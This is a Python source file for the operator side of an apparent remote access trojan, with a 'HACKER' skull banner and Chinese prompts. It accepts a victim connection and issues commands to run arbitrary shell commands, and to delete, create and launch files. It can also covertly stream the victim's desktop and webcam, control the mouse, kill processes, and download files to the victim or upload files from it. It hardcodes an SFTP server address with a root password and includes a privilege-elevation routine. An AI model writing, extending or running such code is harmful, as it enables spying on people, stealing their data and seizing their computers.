from socket import *
import os
import time
import json
import cv2
import numpy as np
import threading
import struct
import sys
from kehu import *
import re
sadon='''
$$$$$$$$$$                                                                                                              
                                       $$$                                                                                                            
                                       $$$$                                                                                                           
                                $      $$$$                                                                                                           
                           $$$$$$$$$$$$$$$$                                                                                                           
                       $$$$$$$$$$$$$$$$$$$$$                                                                                                          
           $$         $$$$$$$$$$$$$$$$$$$$$$$$                                                                                                        
           $$$      $$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                                       
             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                                    
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                                  
                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                                 
                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                               
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                              
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                               
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                              
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                             
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                             
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$         ooooo   ooooo       .o.         .oooooo.   oooo    oooo oooooooooooo ooooooooo.   
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$        `888'   `888'      .888.       d8P'  `Y8b  `888   .8P'  `888'     `8 `888   `Y88.                                                                             
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$        888     888      .8"888.     888           888  d8'     888          888   .d88' 
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       888ooooo888     .8' `888.    888           88888[       888oooo8     888ooo88P'
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     888     888    .88ooo8888.   888           888`88b.     888    "     888`88b.
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    888     888   .8'     `888.  `88b    ooo   888  `88b.   888       o  888  `88b.
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o888o   o888o o88o     o8888o  `Y8bood8P'  o888o  o888o o888ooooood8 o888o  o888o 
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                 
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                               
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                              
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                            
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                             
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                            
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                           
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                          
                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                          
                $ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                          
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                         
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $      $$$ $$$$$$$$$$                                                 
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                       
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                    
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                               
                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                              
                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                             
                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                             
                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                            
                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                            
                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                            
                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                            
                    $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                             
                    $$$$$$$   $ $$$$$$$$$$$$$$$$$$$$ $$             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                              
                    $$$$$$$     $$$$$$$$$$$$$$$$$$$$  $$                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                               
                     $$$$$$      $$$$$$$$$$$$$$$$$$$                            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                 
                     $$$$$$       $$$$$$$$$$$$$$$$$$                          $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                  
                     $$$$$$        $$$$$$$$$$$$$$$ $$                       $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                    
                      $$$$$           $$$$$$$$$$$$                         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                       
                      $$$$$            $$$$$$$$$$                        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                      $$$$$              
                       $$$$            $$$$$$$$$$                       $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                      $$$$$$$$             
                       $$$$            $$$$$$$$$                      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                     $$$$$$$$$$$$      $$$$$
                        $$             $$$$$$$$$                     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$$$$$$$$$$$$$$$$$$  $$$$$$$
                                       $$$$$$$$                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                                      $$$$$$$$$                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                                      $$$$$$$$$                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                                      $$$$$$$$                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                        $$$$$$$$$$$$$$$$$$$$$$                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$       $$$$$$$$$$$$$$$$$$$$$$$$$$$$$                   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                          uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"'''
RED = "\033[91m"  # 红色
RESET = "\033[0m"  # 重置颜色
# ANSI 颜色代码
BLUE = "\033[94m"
RESET = "\033[0m"
sadon1 = re.sub(r'[jJ]', ' ', sadon)
blue_chars = 'o8bdPY"\'.['

# 使用正则表达式替换多个字符为蓝色
def color_specific_chars(text):
    def replacer(match):
        char = match.group(0)
        if char in blue_chars:
            return f'{BLUE}{char}{RESET}'
        else:
            return char

    # 替换所有匹配的字符
    colored_text = re.sub(r'[{}]'.format(''.join(map(re.escape, blue_chars))), replacer, text)
    return colored_text

import re

# 将指定字符改为蓝色
sadon2 = color_specific_chars(sadon1)
sadon3=sadon2.replace('$', f'{RED}${RESET}')
print(sadon3)
# 全局变量，用于控制远程桌面查看
viewing_desktop = False
desktop_thread = None


def print_help():
    """Print available commands"""
    help_text = """
    可用命令:
    h - 显示此帮助信息
    shutdown - 关闭远程计算机
    reboot - 重启远程计算机
    mkdir - 创建文件夹或写入文件
    delete - 删除文件或文件夹
    ls - 查看目录内容
    cd - 切换当前工作目录
    desk/desktop - 实时查看远程桌面 (按 'q' 键退出)
    stopdesktop - 停止查看远程桌面
    mouse - 控制远程计算机鼠标
    change - 切换壁纸
    start - 运行可执行文件
    deskscreen -查看屏幕(可鼠标点击控制）
    http_download - 让远程计算机从URL下载文件
    http_upload - 让远程计算机上传文件到Web服务器
    webcam - 查看远程摄像头 (按 'q' 键退出)
    stopwebcam - 停止查看远程摄像头
    ps - 获取进程信息
    ps-kill 杀死某一进程
    dos -让计算机执行dos命令
    exit - 退出程序
    sleep-关闭客户端程序
    """
    print(help_text)

# 全局变量，用于控制摄像头视频流
viewing_webcam = False
webcam_thread = None
SFTP_DEFAULT_HOST = "47.109.201.222"
SFTP_DEFAULT_PORT = "22"
SFTP_DEFAULT_USERNAME = "root"
SFTP_DEFAULT_PASSWORD = "Aa411210qwer"
def elevate_privileges():
    """尝试提升程序权限 (仅适用于Windows系统)"""
    if sys.platform.startswith('win'):
        try:
            # 检查是否已有管理员权限
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                # 尝试重启程序获取管理员权限
                script = os.path.abspath(sys.argv[0])
                params = ' '.join([f'"{item}"' for item in sys.argv[1:]])

                ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",
                    sys.executable,
                    f'"{script}" {params}',
                    None,
                    1
                )
                # 退出当前实例
                sys.exit(0)
            return True
        except Exception:
            return False
    return False
def receive_webcam_frames(client_socket):
    """接收并显示远程摄像头画面的线程函数"""
    global viewing_webcam

    cv2.namedWindow("Remote Webcam", cv2.WINDOW_NORMAL)

    try:
        while viewing_webcam:
            try:
                # 接收图像大小信息 (4字节整数)
                size_data = client_socket.recv(4)
                if not size_data or len(size_data) < 4:
                    break

                size = struct.unpack('>I', size_data)[0]

                # 接收图像数据
                received_data = b''
                remaining = size

                while remaining > 0:
                    chunk = client_socket.recv(min(4096, remaining))
                    if not chunk:
                        break
                    received_data += chunk
                    remaining -= len(chunk)

                # 解码和显示图像
                if len(received_data) == size:
                    # 转换为OpenCV格式并显示
                    img_array = np.frombuffer(received_data, dtype=np.uint8)
                    frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

                    if frame is not None:
                        cv2.imshow("Remote Webcam", frame)
                        # 检查退出键
                        key = cv2.waitKey(1) & 0xFF
                        if key == ord('q'):
                            viewing_webcam = False
                            break
            except Exception as e:
                print(f"接收摄像头画面时出错: {e}")
                break

    except Exception as e:
        print(f"摄像头查看线程错误: {e}")

    finally:
        viewing_webcam = False
        cv2.destroyWindow("Remote Webcam")
        print("远程摄像头查看已停止")
def receive_desktop_frames(client_socket):
    """接收并显示远程桌面画面的线程函数"""
    global viewing_desktop

    cv2.namedWindow("Remote Desktop", cv2.WINDOW_NORMAL)

    try:
        while viewing_desktop:
            try:
                # 接收图像大小信息 (4字节整数)
                size_data = client_socket.recv(4)
                if not size_data or len(size_data) < 4:
                    break

                size = struct.unpack('>I', size_data)[0]

                # 接收图像数据
                received_data = b''
                remaining = size

                while remaining > 0:
                    chunk = client_socket.recv(min(4096, remaining))
                    if not chunk:
                        break
                    received_data += chunk
                    remaining -= len(chunk)

                # 解码和显示图像
                if len(received_data) == size:
                    # 转换为OpenCV格式并显示
                    img_array = np.frombuffer(received_data, dtype=np.uint8)
                    frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

                    if frame is not None:
                        cv2.imshow("Remote Desktop", frame)
                        # 检查退出键
                        key = cv2.waitKey(1) & 0xFF
                        if key == ord('q'):
                            viewing_desktop = False
                            break
            except Exception as e:
                print(f"接收桌面画面时出错: {e}")
                break

    except Exception as e:
        print(f"桌面查看线程错误: {e}")

    finally:
        viewing_desktop = False
        cv2.destroyWindow("Remote Desktop")
        print("远程桌面查看已停止")


def run_server():
    """Run the remote control server"""
    global viewing_desktop, desktop_thread, viewing_webcam, webcam_thread

    # 创建服务器套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 3000))
    server_socket.listen(5)
    print("服务器已启动，等待客户端连接...")

    try:
        # 等待客户端连接
        client_socket, client_address = server_socket.accept()
        print(f"客户端已连接: {client_address}")

        # 接收客户端的初始消息
        initial_message = client_socket.recv(8192).decode()
        print(f"客户端信息: {initial_message}")

        # 命令循环
        while True:
            # 输入命令
            command = input("\n输入你的命令 (h 查看帮助): ")

            # ... 保留原有代码 ...
            if command.lower() == 'h':
                print_help()
                continue

            elif command.lower() == 'exit':
                print("关闭连接...")
                client_socket.send("exit".encode())
                print(client_socket.recv(1024).decode())
                break

            elif command.lower() in ['shutdown', 'reboot']:
                confirmation = input(f"确认要{command}远程计算机吗? (y/n): ")
                if confirmation.lower() == 'y':
                    client_socket.send(command.encode())
                    response = client_socket.recv(1024).decode()
                    print(f"客户端响应: {response}")
                else:
                    print("操作已取消")

            elif command.lower() == 'mkdir':
                path = input("输入文件/文件夹路径: ")
                if '.' in os.path.basename(path):  # 判断是文件还是文件夹
                    print("输入文件内容 (输入'###END###'单独一行来结束输入):")
                    content_lines = []
                    while True:
                        line = input()
                        if line == "###END###":
                            break
                        content_lines.append(line)
                    content = "\n".join(content_lines)
                    data = {"command": "mkdir", "path": path, "content": content, "is_file": True}
                else:
                    data = {"command": "mkdir", "path": path, "is_file": False}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")
            elif command.lower() == 'deskscreen':
                client_socket.send(command.lower().encode())
                desk()

            elif command.lower() == "dos":
                dos_cmd = input("输入你的dos命令: ").strip()
                if not dos_cmd:
                    print("dos命令不能为空")
                    continue

                data = {"command": "dos", "dos": dos_cmd}
                client_socket.send(json.dumps(data).encode('utf-8'))

                # 接收完整响应
                full_response = b''
                while True:
                    part = client_socket.recv(65536)  # 每次接收 64KB
                    if not part:
                        break
                    full_response += part
                    # 如果收到的数据不足最大接收长度，说明已经接收完
                    if len(part) < 65536:
                        break

                try:
                    decoded_response = full_response.decode('utf-8')
                    print(f"服务器响应:\n{decoded_response}")
                except Exception as e:
                    print(f"解码失败: {e}")

            elif command.lower() == 'delete':
                path = input("输入要删除的文件/文件夹路径: ")
                confirmation = input(f"确认删除 {path}? (y/n): ")
                if confirmation.lower() == 'y':
                    data = {"command": "delete", "path": path}
                    client_socket.send(json.dumps(data).encode())
                    response = client_socket.recv(1024).decode()
                    print(f"客户端响应: {response}")
                else:
                    print("删除操作已取消")

            elif command.lower() == 'ls':
                path = input("输入要查看的目录路径 (默认为当前目录): ") or "."
                data = {"command": "ls", "path": path}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(8192).decode()
                print(f"目录内容:\n{response}")

            elif command.lower() == 'cd':
                path = input("输入要切换的目录路径: ")
                data = {"command": "cd", "path": path}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")

            # 在命令处理部分添加(或修改现有的desktop命令)
            elif command.lower() == 'desk' or command.lower() == 'desktop':
                # 检查是否已经在查看桌面
                if viewing_desktop:
                    print("已经在查看远程桌面，请先停止当前查看")
                    continue

                # 发送查看桌面命令，无需额外输入
                data = {"command": "desktop", "start": True}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")

                if "准备发送" in response:
                    viewing_desktop = True
                    # 创建线程接收和显示桌面画面
                    desktop_thread = threading.Thread(target=receive_desktop_frames, args=(client_socket,))
                    desktop_thread.daemon = True
                    desktop_thread.start()
                    print("远程桌面查看已启动，按 'q' 键退出")
            elif command.lower() == 'stopdesktop':
                if viewing_desktop:
                    viewing_desktop = False
                    data = {"command": "desktop", "start": False}
                    client_socket.send(json.dumps(data).encode())
                    response = client_socket.recv(1024).decode()
                    print(f"客户端响应: {response}")

                    # 等待桌面线程结束
                    if desktop_thread and desktop_thread.is_alive():
                        desktop_thread.join(2)
                else:
                    print("没有活动的远程桌面查看")

            elif command.lower() == 'change1' or command.lower() == 'change2' or command.lower() == 'change0':
                #wallpaper_path = input("输入壁纸图片的路径 (客户端电脑上的路径): ")
                data = {"command":command.lower() }
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")
            elif command.lower() == 'ps':
                client_socket.send(command.encode())

                response = client_socket.recv(1024 * 1024)  # 接收大量数据
                processes = json.loads(response.decode())

                columns = ['name', 'pid', 'username', 'cpu_percent', 'memory_percent', 'create_time']

                print("{:<15} {:<6} {:<15} {:<8} {:<8} {:<20}".format(*columns))
                print("-" * 100)

                for proc in processes:
                    row = [str(proc[col]) for col in columns]
                    print("{:<15} {:<6} {:<15} {:<8} {:<8} {:<20}".format(*row))

                # 新增：用户输入要查询的进程名
                search = input("请输入你要查询的进程名称（如 chrome.exe）: ").strip().lower()

                # 筛选匹配的进程
                matched = [p for p in processes if p['name'].lower() == search]

                if matched:
                    print("\n匹配到以下进程：")
                    print("{:<15} {:<6}".format("name", "pid"))
                    print("-" * 30)
                    for m in matched:
                        print("{:<15} {:<6}".format(m['name'], m['pid']))
                else:
                    print(f"\n未找到名称为 '{search}' 的进程。")
            elif command.lower() == "ps-kill":
                pid = input("请输入要终止的进程 PID或进程名称: ").strip()
                client_socket.send("ps-kill".encode())
                client_socket.send(pid.encode())

                response = client_socket.recv(1024).decode()
                print("[*]", response)
            elif command.lower() == 'start':
                program_path = input("输入要运行的程序路径: ")
                data = {"command": "start", "path": program_path}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")

            # 在run_server()函数中，添加或替换以下代码
            elif command.lower() == 'http_download':
                print("从网络下载文件到远程计算机")
                url = input("输入文件下载URL: ")
                local_path = input("输入远程计算机上的保存路径: ")

                # 可选：添加自定义请求头
                use_headers = input("是否添加自定义HTTP头? (y/n): ").lower() == 'y'
                headers = None
                if use_headers:
                    headers = {}
                    print("输入HTTP头信息 (格式: 键:值，输入空行结束)")
                    while True:
                        header_line = input()
                        if not header_line:
                            break
                        if ':' in header_line:
                            key, value = header_line.split(':', 1)
                            headers[key.strip()] = value.strip()

                data = {
                    "command": "http_download",
                    "url": url,
                    "local_path": local_path,
                    "headers": headers
                }

                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(8192).decode()
                print(f"客户端响应: {response}")

            elif command.lower() == 'http_upload':
                print("从远程计算机上传文件到Web服务器")
                local_path = input("输入远程计算机上的文件路径: ")
                # url = input("输入接收文件的URL: ")
                # field_name = input("输入文件表单字段名 (默认为'file'): ") or "file"
                #
                # # 可选：添加额外表单数据
                # use_extra_data = input("是否添加额外表单数据? (y/n): ").lower() == 'y'
                # extra_data = None
                # if use_extra_data:
                #     extra_data = {}
                #     print("输入表单数据 (格式: 键:值，输入空行结束)")
                #     while True:
                #         data_line = input()
                #         if not data_line:
                #             break
                #         if ':' in data_line:
                #             key, value = data_line.split(':', 1)
                #             extra_data[key.strip()] = value.strip()

                data = {
                    "command": "http_upload",
                    "local_path": local_path,
                }
                print(local_path)
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(8192).decode()
                print(f"客户端响应: {response}")
            elif command.lower() == 'mouse':
                action = input("输入鼠标操作(move/click/doubleclick/rightclick): ")
                if action.lower() not in ['move', 'click', 'doubleclick', 'rightclick']:
                    print("无效的鼠标操作")
                    continue

                if action.lower() == 'move':
                    try:
                        x = int(input("输入X坐标: "))
                        y = int(input("输入Y坐标: "))
                    except ValueError:
                        print("坐标必须是数字")
                        continue
                else:
                    choice = input("是否指定坐标? (y/n): ")
                    if choice.lower() == 'y':
                        try:
                            x = int(input("输入X坐标: "))
                            y = int(input("输入Y坐标: "))
                        except ValueError:
                            print("坐标必须是数字")
                            continue
                    else:
                        x = None
                        y = None

                data = {
                    "command": "mouse",
                    "action": action.lower(),
                    "x": x,
                    "y": y
                }
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")
            elif command.lower() == 'webcam':
                # 检查是否已经在查看摄像头
                if viewing_webcam:
                    print("已经在查看远程摄像头，请先停止当前查看")
                    continue

                # 发送查看摄像头命令
                data = {"command": "webcam", "start": True}
                client_socket.send(json.dumps(data).encode())
                response = client_socket.recv(1024).decode()
                print(f"客户端响应: {response}")

                if "准备发送" in response:
                    viewing_webcam = True
                    # 创建线程接收和显示摄像头画面
                    webcam_thread = threading.Thread(target=receive_webcam_frames, args=(client_socket,))
                    webcam_thread.daemon = True
                    webcam_thread.start()
                    print("远程摄像头查看已启动，按 'q' 键退出")

            elif command.lower() == 'stopwebcam':
                if viewing_webcam:
                    viewing_webcam = False
                    data = {"command": "webcam", "start": False}
                    client_socket.send(json.dumps(data).encode())
                    response = client_socket.recv(1024).decode()
                    print(f"客户端响应: {response}")

                    # 等待摄像头线程结束
                    if webcam_thread and webcam_thread.is_alive():
                        webcam_thread.join(2)
                else:
                    print("没有活动的远程摄像头查看")
            elif command.lower() == 'sleep':
                client_socket.send(command.encode())
            else:
                print(f"未知命令: {command}")
                print("输入 'h' 获取可用命令列表")

            # ... 保留原有代码 ...

    except Exception as e:
        print(f"发生错误: {e}")

    finally:
        # 确保远程桌面和摄像头查看停止
        viewing_desktop = False
        viewing_webcam = False

        # 关闭连接
        try:
            client_socket.close()
        except:
            pass
        server_socket.close()
        print("服务器已关闭")

if __name__ == "__main__":
    print('远程控制服务器 v1.0')
    print('输入 h - 获取帮助信息')
    elevate_privileges()
    run_server()